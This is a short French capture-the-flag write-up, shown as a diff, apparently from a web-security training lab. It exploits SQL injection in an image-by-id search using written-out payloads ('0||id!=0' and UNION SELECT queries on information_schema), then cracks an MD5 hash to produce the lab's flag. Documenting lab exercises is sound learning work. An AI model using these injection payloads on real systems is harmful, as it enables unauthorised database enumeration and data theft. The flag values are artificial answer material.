@@ -1,0 +1,28 @@
+Lorsqu'on va sur la page de recherche d'image par id, on voit que l'input nest pas securise.
+
+Si on entre :
+0||id!=0
+
+On recoit la liste de toutes les images.
+La derniere s'appelle "Hack me ?"
+
+On peut donc recuperer la liste de toutes les tables:
+0 UNION SELECT null, table_name FROM information_schema.tables
+
+On utilise cette requete pour obtenir chaque colonne de chaque tableau:
+0 UNION SELECT table_name, column_name FROM information_schema.columns
+
+On sait donc que list_images contient:
+id
+url
+title
+comment
+
+0 UNION SELECT title, comment FROM list_images
+L'image "Hack Me ?" a une instruction dans son titre:
+
+title : 
+"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
+
+En suivant le title:
+"1928e8083cf461a51303633093573c46" decrypt md5-> "albatroz" encrypt sha256-> "f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188"
